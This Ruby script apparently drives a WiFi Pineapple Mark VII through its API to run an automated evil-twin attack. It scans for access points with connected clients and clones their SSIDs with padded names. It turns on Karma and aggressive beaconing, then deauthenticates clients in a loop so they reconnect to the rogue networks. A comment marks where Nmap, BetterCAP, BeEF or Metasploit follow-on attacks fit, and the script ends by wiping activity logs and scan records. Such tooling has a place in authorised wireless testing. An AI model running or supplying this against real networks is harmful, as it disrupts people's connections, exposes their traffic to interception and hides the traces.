require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    # SETUP
    #
    led.setup

    pineap_settings = PineappleMK7::Modules::PineAP::Settings.new
    pineap_settings.enablePineAP = true
    pineap_settings.save

    recon_scanning = PineappleMK7::Modules::Recon::Scanning.new
    SCAN_TIME = 240
    PREFIX_TWIN = ' '
    SUFFIX_TWIN = ' '

    pineap_filtering = PineappleMK7::Modules::PineAP::Filtering.new

    pineap_clients = PineappleMK7::Modules::PineAP::Clients.new

    logging_activity = PineappleMK7::Modules::Logging::Activity.new

    # ATTACK 1
    #
    led.attack

    scanID = (recon_scanning.start(SCAN_TIME)).scanID
    output = recon_scanning.output(scanID)
    
    # SPECIAL
    #
    led.special

    pineap_settings.enablePineAP = false
    pineap_settings.save

    pineap_filtering.client_filter('deny')
    pineap_filtering.ssid_filter('deny')

    ap_clients = []
    output.APResults.each do |ap|
        if (ap.ssid.empty? === false && ap.clients.nil? === false)
            ap_clients << ap
            pineap_settings.add_ssid(PREFIX_TWIN + ap.ssid + SUFFIX_TWIN)
        end
    end

    pineap_settings.enablePineAP = true
    pineap_settings.karma = true
    pineap_settings.beacon_responses = true
    pineap_settings.broadcast_ssid_pool = true
    pineap_settings.beacon_response_interval = 'AGGRESSIVE'
    pineap_settings.beacon_interval = 'AGGRESSIVE'
    pineap_settings.save

    sleep(45)

    # ATTACK 2
    #
    led.attack

    puts('[+] Client(s)')

    if (ap_clients.size > 0)

        30.times do
            
            ap_clients.each do |ap|
                recon_scanning.deauth_ap(ap)
            end

            sleep(10)

            pineap_clients.connected_clients.each do |client|
                pp(client)
                # Nmap, BetterCAP, BeEF, Metasploit, ... actions
                pineap_filtering.add_client(client.mac)
                pineap_clients.kick(client.mac)
            end

        end

    end

    # FINISH
    #
    led.finish

    pineap_settings = PineappleMK7::Modules::PineAP::Settings.new
    pineap_settings.save
    pineap_settings.clear_pool

    # CLEANUP
    #
    led.cleanup

    pineap_filtering.clear_clients
    recon_scanning.delete(scanID)
    pineap_clients.clear_previous
    logging_activity.clear

    # OFF
    #
    led.off

end